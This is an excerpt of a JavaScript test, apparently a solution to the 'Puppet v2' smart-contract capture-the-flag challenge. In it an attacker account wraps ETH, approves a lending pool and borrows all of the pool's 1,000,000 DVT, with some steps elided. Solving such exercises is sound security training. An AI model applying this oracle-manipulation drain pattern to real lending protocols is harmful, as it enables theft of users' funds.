...
describe("[Challenge] Puppet v2", function () {
  ...
  it("Exploit", async function () {
    ...
    await this.weth
      .connect(attacker)
      .deposit({ value: ethers.utils.parseEther("19.8") });
    ...
    await this.weth
      .connect(attacker)
      .approve(this.lendingPool.address, attackerWETHBalance);

    // Get all DVT from LendingPool
    await this.lendingPool
      .connect(attacker)
      .borrow(ethers.utils.parseEther("1000000"));
  });
